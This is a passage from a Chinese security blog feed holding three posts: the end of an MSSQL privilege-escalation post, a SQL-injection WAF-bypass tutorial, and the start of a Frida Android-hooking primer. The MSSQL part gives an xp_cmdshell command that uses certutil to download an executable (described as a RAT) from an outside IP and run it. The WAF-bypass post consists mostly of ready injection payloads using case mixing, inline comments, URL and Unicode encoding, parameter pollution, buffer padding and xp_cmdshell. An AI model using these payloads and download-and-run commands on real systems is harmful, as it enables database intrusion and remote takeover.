<span class="type">CHAR</span>(<span class="number">39</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">41</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="variable">@a</span>;</span><br></pre></td></tr></table></figure><h2 id="站库分离提权"><a href="#站库分离提权" class="headerlink" title="站库分离提权"></a>站库分离提权</h2><p>在我们遇到站库分离的时候，没办法写webshell，后台也没办法拿下shell的情况下不妨试试用xp_cmdshell下载我们的RAT直接拿下数据库.通过下载木马执行来上线提权.</p><p>1.certutil</p><p>2.vbs</p><p>3.bitsadmin</p><p>4.powershell</p><p>5.ftp</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master.dbo.xp_cmdshell <span class="string">&#x27;cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> master.dbo.xp_cmdshell <span class="string">&#x27;cd c:\www &amp; file.exe&#x27;</span>;</span><br></pre></td></tr></table></figure><p>参考:<a href="https://mp.weixin.qq.com/s/FWsU6nFlX7j7jZxDi7xglA">https://mp.weixin.qq.com/s/FWsU6nFlX7j7jZxDi7xglA</a></p><p> union select name from test.dbo.columns where id=(select id from test.dbo.sysobjects  where name =’users’)–</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;权限控制&quot;&gt;&lt;a href=&quot;#权限控制&quot; class=&quot;headerlink&quot; title=&quot;权限控制&quot;&gt;&lt;/a&gt;权限控制&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;固定服务器角色&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;</summary>
      
    
    
    
    
    <category term="sql注入" scheme="https://bstark.me/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入常见字符WAF绕过</title>
    <link href="https://bstark.me/posts/24561/"/>
    <id>https://bstark.me/posts/24561/</id>
    <published>2022-01-20T11:04:52.000Z</published>
    <updated>2022-01-23T07:58:42.758Z</updated>
    
    <content type="html"><![CDATA[<p>大小写混合<br>替换关键字<br>使用编码<br>使用注释<br>参数污染<br>缓冲区溢出<br>性能因素<br>整合绕过…….</p><h3 id="1-大小写绕过："><a href="#1-大小写绕过：" class="headerlink" title="1.大小写绕过："></a>1.大小写绕过：</h3><ul><li>大小写绕过用于只针对小写或大写的关键字匹配技术</li><li>出现原因：在waf里，使用的正则不完善或者是没有用大小写转换函数</li><li>用法：比如，拦截了union，那就使用uNIoN</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.com<span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">-3</span>uNIoNsELect1,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="2-替换关键字"><a href="#2-替换关键字" class="headerlink" title="2.替换关键字"></a>2.替换关键字</h3><h4 id="关键字双写"><a href="#关键字双写" class="headerlink" title="关键字双写"></a>关键字双写</h4><ul><li>出现原因：利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。</li><li>用法：xxx.com/index.php?id=-3UNIunionONSELselectECT1,2,3</li></ul><h4 id="同价词替换"><a href="#同价词替换" class="headerlink" title="同价词替换"></a>同价词替换</h4><ul><li><p>出现原因：WAF主要是针对一些特殊的关键词进行检测</p></li><li><p>and和or不能使用：&amp;&amp;和|| and和or xro ! not</p></li><li><p>=不能使用的情况：可以尝试&lt;、&gt;=</p></li><li><p>空格不能使用（常见）：%20%09%0a%0b%0c%0d%a0/**/空格</p></li><li><p>注意：在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗</p></li></ul><h4 id="特殊字符拼接"><a href="#特殊字符拼接" class="headerlink" title="特殊字符拼接"></a>特殊字符拼接</h4><ul><li>出现原因：把特殊字符拼接起来绕过WAF的检测</li><li>用法：如在函数里可以用+来拼接，在Mysql中可以利用注释/**/绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx.com<span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">exec</span>(master..xp_cmdshell<span class="string">&#x27;netuser’)</span></span><br><span class="line"><span class="string">xxx.com/index.php?id=1;exec(&#x27;</span>maste<span class="string">&#x27;+&#x27;</span>r..xp<span class="string">&#x27;+&#x27;</span>_cmdshell<span class="string">&#x27;+&#x27;</span>&quot;netuser&quot;<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure><h3 id="3-编码绕过"><a href="#3-编码绕过" class="headerlink" title="3.编码绕过"></a>3.编码绕过</h3><ul><li><p>对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、base64等URL编码</p></li><li><p>出现原因：利用浏览器上的进制转换或者语言编码规则来绕过waf</p></li></ul><h4 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h4><ul><li>输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28等</li><li>注意：如果URL编码只进行了一次过滤，可以用两次编码绕过</li><li>用法：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span>SELECT1,<span class="number">2</span>,<span class="number">3</span>index.php?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">75</span><span class="operator">%</span><span class="number">6</span>e<span class="operator">%</span><span class="number">69</span><span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">6</span>e<span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">73</span><span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">6</span>c<span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">74</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">2</span>c<span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">2</span>c<span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">0</span>a</span><br></pre></td></tr></table></figure><ul><li><strong>常用url编码</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">空格绕过:</span><br><span class="line">/*%0A*/    //#强制空格</span><br><span class="line">%0A%0D     //使用换行符代替空格。注意服务器若为Windows则换行符为%0A%0D，Linux则为%0A</span><br><span class="line">%09TAB 键(水平)</span><br><span class="line">%0a新建一行</span><br><span class="line">%0c新的一页</span><br><span class="line">%0dreturn 功能</span><br><span class="line">%0bTAB 键(垂直)</span><br><span class="line">%a0空格</span><br><span class="line"></span><br><span class="line">绕过 </span><br><span class="line">/*%0A*/union/*%0A*/</span><br><span class="line">/*%0A*/and/*%0A*/</span><br></pre></td></tr></table></figure><h4 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h4><ul><li><p>常用符号的Unicode编码：单引号:%u0027空格：%u0020左括号：%u0028右括号：%u0029</p></li><li><p>用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span>unionselect1,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span>un<span class="operator">%</span>u0069onsel<span class="operator">%</span>u0065ct1,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="4-注释绕过："><a href="#4-注释绕过：" class="headerlink" title="4.注释绕过："></a>4.注释绕过：</h3></li><li><p>常见的用于注释的符号：//、–、/**/、#、–+、—、;、–a</p></li><li><p>出现原因：利用语言函数特性来绕过waf的规则</p></li></ul><h4 id="普通注释"><a href="#普通注释" class="headerlink" title="普通注释"></a>普通注释</h4><ul><li>/**/在构造的查询语句中插入注释，规避对空格的依赖或关键字识别。* </li><li>用法：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span>UNIONSELECT1,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span>SELECT1,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><ul><li>相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别(/<em>！</em>/表示注释里面的语句会被执行)*</li><li><em>用法：采用/</em>!code*/来执行我们的SQL语句，内联注释可以用于整个SQL语句中</li><li>举例：过滤器过滤了如下内容 这些都是我们内联绕过需要绕过的目标</li><li>•注意：/<em>!50001select</em>fromtest*/的含义：表示假如数据库是5.00.01以上版本，该语句才会被执行</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span>,<span class="keyword">where</span>,table_name,table_schema,<span class="operator">=</span>,andinformation_schema，</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>unionselect1,<span class="number">2</span>,concat(table_name)frominformation_schema.tableswheretable_schema<span class="operator">=</span>database()</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">/*!UnIoN*/</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,concat(<span class="comment">/*!table_name*/</span>)<span class="operator">+</span><span class="keyword">FrOM</span><span class="comment">/*!information_schema*/</span>.tables<span class="comment">/*!WHERE*/</span><span class="operator">+</span><span class="comment">/*!TaBlE_ScHeMa*/</span><span class="operator">+</span><span class="keyword">like</span><span class="operator">+</span>database()</span><br></pre></td></tr></table></figure><h3 id="5-参数污染："><a href="#5-参数污染：" class="headerlink" title="5.参数污染："></a>5.参数污染：</h3><ul><li><p>HPP(HTTPParameterPolution)又称做重复参数污染，当同一参数出现多次，不同中间件会解析为不同的结果</p></li><li><p>如果WAF只检测了同参数名中的第一个或最后一个，并且中间件特性正好取与WAF相反的参数，则可成功绕过</p></li><li><p>案例：ModSecurity过滤器会将类似于select1,2,3fromtable这类的语句归类为黑名单当web服务器遇到类似/index.aspx?id=select1,2,3fromtable这样的语句时，会阻断请求但是这个web服务器在遇到为同一个参数赋值不同数值时，会将它们连接起来，攻击者通过这个方法来绕过黑名单</p></li></ul> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span> 想要执行的语句：<span class="operator">/</span>index.aspx?id<span class="operator">=</span>select1,<span class="number">2</span>,<span class="number">3</span>fromtable</span><br><span class="line"><span class="operator">*</span> 提交的URL：<span class="operator">/</span>index.aspx?id<span class="operator">=</span>select1<span class="operator">&amp;</span>id<span class="operator">=</span>,<span class="number">2</span>,<span class="number">3</span>fromtable</span><br></pre></td></tr></table></figure><ul><li><p>说明：</p></li><li><p>1、这不属于黑名单中的模式，不会触发黑名单的拦截功能</p></li><li><p>2、由于WEB程序会采取连接操作，即将&amp;符号前后的内容个连接，因此SQL注入行为能够被执行</p></li></ul><h3 id="6-缓冲区溢出："><a href="#6-缓冲区溢出：" class="headerlink" title="6.缓冲区溢出："></a>6.缓冲区溢出：</h3><ul><li><p>缓冲区溢出用于绕过WAF，许多WAF是C语言写的，而C语言自身没有缓冲区保护机制</p></li><li><p>因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p></li><li><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span>(select1)<span class="operator">=</span>(Select0xAAAAAAAAA<span class="operator">*</span><span class="number">1000</span>moreA)<span class="operator">+</span><span class="keyword">UnIoN</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,version(),<span class="number">4</span>,<span class="number">5</span>,database(),<span class="keyword">user</span>(),<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li><p>说明：示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。</p></li></ul><h3 id="7-整合绕过："><a href="#7-整合绕过：" class="headerlink" title="7.整合绕过："></a>7.整合绕过：</h3><ul><li>整合的意思是结合使用前面的各种绕过技术，单一的技术可能无法绕过过滤机制，但多种技术的配合使用成功的可能性会增加</li><li>多种技术的使用增加了更多的可能性，除非每一种技术单独都无法使用，否则它们能大大增加绕过的成功性</li><li>例如：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">/*!UnIoN*/</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,concat(<span class="comment">/*!table_name*/</span>)<span class="operator">+</span><span class="keyword">FrOM</span><span class="comment">/*information_schema*/</span>.tables<span class="comment">/*!WHERE*/</span><span class="operator">+</span><span class="comment">/*!TaBlE_ScHeMa*/</span><span class="operator">+</span><span class="keyword">like</span><span class="operator">+</span>database()</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="comment">/*!UNION*/</span><span class="operator">+</span><span class="comment">/*!SELECT*/</span><span class="operator">+</span><span class="number">1</span>,GrOUp_COnCaT(COLUMN_NAME),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span><span class="comment">/*!INFORMATION_SCHEM*/</span>.COLUMNS<span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>TABLE_NAME<span class="operator">=</span><span class="number">0x41646d696e</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><h3 id="8-分块传输绕过："><a href="#8-分块传输绕过：" class="headerlink" title="8.分块传输绕过："></a>8.分块传输绕过：</h3><ul><li>当我们将传输的内容分块时，处理后的HTTP请求由于和已知的payload相差较大，所以可以起到一定的绕过WAF的效果</li><li>举例：正常输入id=1and1=2，被安全狗拦住</li><li>举例：使用分块传输，将id=1and1=2进行分块，成功绕过了安全狗•注意：分块传输需要将关键字and,or,select,union等关键字拆开，不然仍然会被waf拦截。编码过程中长度需包括空格的长度。最后用0表示结束，并在0后空两行表示数据包结束</li></ul><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220118202522075.png" alt="image-20220118202522075"></p><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>Q: 注入过程中where table_schema=”admin” 时候””被过滤</p><ul><li><strong>嵌套子查询语句</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">4</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>十六进制</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure><ul><li><strong>assci码</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="type">char</span>(<span class="number">104</span>,<span class="number">115</span>,<span class="number">110</span>,<span class="number">112</span>)</span><br></pre></td></tr></table></figure><h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><ul><li><strong>substr() ,mid() ,limit</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);   <span class="operator">/</span><span class="operator">/</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> mid(database(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);      <span class="operator">/</span><span class="operator">/</span><span class="keyword">from</span> <span class="keyword">for</span> 绕过</span><br></pre></td></tr></table></figure><ul><li><strong>limit</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span>  <span class="number">0</span>    <span class="operator">/</span><span class="operator">/</span> <span class="keyword">offset</span> 绕过</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> </span><br></pre></td></tr></table></figure><h3 id="比较符号绕过-lt-gt"><a href="#比较符号绕过-lt-gt" class="headerlink" title="比较符号绕过&lt;&gt;"></a>比较符号绕过&lt;&gt;</h3><ul><li><strong>greatest</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;大小写混合&lt;br&gt;替换关键字&lt;br&gt;使用编码&lt;br&gt;使用注释&lt;br&gt;参数污染&lt;br&gt;缓冲区溢出&lt;br&gt;性能因素&lt;br&gt;整合绕过…….&lt;/p&gt;
&lt;h3 id=&quot;1-大小写绕过：&quot;&gt;&lt;a href=&quot;#1-大小写绕过：&quot; class=&quot;headerlink&quot; title=&quot;1.</summary>
      
    
    
    
    
    <category term="SQL注入" scheme="https://bstark.me/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Frida 基础</title>
    <link href="https://bstark.me/posts/3432/"/>
    <id>https://bstark.me/posts/3432/</id>
    <published>2022-01-20T07:01:34.000Z</published>
    <updated>2022-04-01T06:35:47.161Z</updated>
    
    <content type="html"><![CDATA[<h2 id="APP文件结构"><a href="#APP文件结构" class="headerlink" title="APP文件结构"></a>APP文件结构</h2><p><strong>apk</strong>文件，一种压缩包:</p><p><strong>classes.dex</strong>：编译后的代码<br><strong>AndroidManifest.xml</strong>：重要配置文件，APP启动入口，界面信息等等<br><strong>assets</strong>：资源目录，没被编译    存放本地<strong>证书</strong><br><strong>lib</strong>：so文件, C++开发的动态链接库  so文件有很多系统架构如x86_64,arm64_a, 导致模拟器闪退的原因<br><strong>res</strong>：资源目录，被编译了<br><strong>resources.arsc</strong>：资源文件索引</p><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>用来了解APP的启动加载流程</p><p>package    包名  一般存在在第一行.</p><p>android.intent.action.MAIN  上一行为启动界面</p><p>MainActivty    主界面</p><h3 id="签名证书的使用"><a href="#签名证书的使用" class="headerlink" title="签名证书的使用"></a>签名证书的使用</h3><p>apktool 重打包成apk：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apktool d test.apk  #反编译</span><br><span class="line">apktool b test      #重新打包</span><br></pre></td></tr></table></figure><p>apktool反编译生成出来的是smail文件,可以用jeb可视化源码对比 smail文件来修改源代码,修改完后,在进行重新打包.</p><p>未签名APK不能在安卓手机上安装, APP在启动时会对签名校验：重打包的APP可能需要逆向，跳过校验</p><p><strong>keytool jarsigner</strong>   工具是JAVA JDK自带的<br> 生成证书:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -keystore my-release-key.keystore -alias my_alias -keyalg RSA -</span><br><span class="line">keysize <span class="number">4096</span> -validity <span class="number">10000</span></span><br></pre></td></tr></table></figure><p>用证书给apk签名:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -sigalg MD5withRSA -digestalg SHA1 -keystore my-release-key.keystore -</span><br><span class="line">signedjar 签名后.apk 签名前.apk my_alias</span><br></pre></td></tr></table></figure><h2 id="插桩技术"><a href="#插桩技术" class="headerlink" title="插桩技术"></a>插桩技术</h2><p>插桩技术是指将额外的代码注入程序中以收集运行时的信息，<strong>可分为两种：</strong></p><p>(1)源代码插桩[Source Code Instrumentation(SCI)]：额外代码注入到程序源代码中。</p><p>(2)二进制插桩（Binary Instrumentation）：额外代码注入到二进制可执行文件中。</p><h3 id="二进制插桩"><a href="#二进制插桩" class="headerlink" title="二进制插桩"></a><strong>二进制插桩</strong></h3><p>●静态二进制插桩[Static Binary Instrumentation(SBI)]：在程序执行前插入额外的代码和数据，生成一个永久改变的可执行文件。</p><p>●动态二进制插桩[Dynamic Binary Instrumentation(DBI)]：在程序运行时实时地插入额外代码和数据，对可执行文件没有任何永久改变。</p><h3 id="实现功能"><a href="#实现功能" class="headerlink" title="实现功能"></a>实现功能</h3><p>（1）访问进程的内存</p><p>（2）在应用程序运行时覆盖一些功能</p><p>（3）从导入的类中调用函数</p><p>（4）在堆上查找对象实例并使用这些对象实例</p><p>（5）Hook，跟踪和拦截函数等等</p><h2 id="frida"><a href="#frida" class="headerlink" title="frida"></a><strong>frida</strong></h2><p>frida是一款基于python + javascript 的hook框架，可运行在android ios linux winosx等各平台，主要使用动态二进制插桩技术。</p><p><strong>HOOK</strong>：在系统没有调用该方法（函数）前，获得该方法（函数)的控制权，从而改写该方法。</p><h3 id="ADB-exe"><a href="#ADB-exe" class="headerlink" title="ADB.exe"></a>ADB.exe</h3><p>Adb常用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">adb shell 进入手机</span><br><span class="line">adb install xxx.apk 安装apk</span><br><span class="line">adb install -r xxx.apk 覆盖安装 </span><br><span class="line">adb uninstall 包名 卸载</span><br><span class="line">adb push 电脑端源文件路径 手机端目标路径 最好把文件放在/sdcard/ 目录下面</span><br><span class="line">adb pull 手机端源文件路径 电脑源文件路径 </span><br><span class="line">adb logcat 查看日志</span><br></pre></td></tr></table></figure><h3 id="frida安装"><a href="#frida安装" class="headerlink" title="frida安装"></a><strong>frida</strong>安装</h3><p>frida框架分为两部分： 一部分是运行在系统上的交互工具frida CLI; 另一部分是运行在目标机器上的代码注入工具 frida-server,手机需要root.</p><p>Python代码作用是控制，写法固定，负责跟frida-server通信，把JS代码传递给frida-serve,Javascript代码作用是Hook操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Frida 常用模块API：</span><br><span class="line"> Java 模块：Hook Java 层的类 方法 相关</span><br><span class="line"> Process 模块：处理当前线程相关</span><br><span class="line"> Interceptor 模块：操作指针相关，多用来Hook Native 相关</span><br><span class="line"> Memory 模块：内存操作相关</span><br><span class="line"> Module 模块：处理so相关</span><br></pre></td></tr></table></figure><p><strong>安装</strong></p><p>1)、下载frida-server 解压 push到手机 增加可执行权限 运行起来,Frida-server. 运行在手机上<br> <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getprop ro.product.cpu.abi   #确认手机的系统架构</span><br><span class="line">adb push frida-server /data/local/tmp/    #adb 把执行文件 push到手机</span><br><span class="line">adb shell   #进入shell</span><br><span class="line">su   #root</span><br><span class="line">cd /data/local/tmp</span><br></pre></td></tr></table></figure><p> 确定手机当前用户是root用户或拥有root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 frida-server</span><br><span class="line">./frida-server&amp;</span><br></pre></td></tr></table></figure><p> 2)、电脑上安装frida</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br></pre></td></tr></table></figure><p> 安装很慢 20分钟<br> <a href="https://pypi.org/project/frida/#files">https://pypi.org/project/frida/#files</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure><p> 3)、测试安装<br> 电脑上运行<br> frida-ps -U 电脑上运行 android.process.acore 字样表示成功<br> windows运行 端口转发到PC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27043 tcp:27043#必要时进行端口转发</span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure><h3 id="HOOk使用"><a href="#HOOk使用" class="headerlink" title="HOOk使用"></a>HOOk使用</h3><p>hook的python代码是固定的:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">        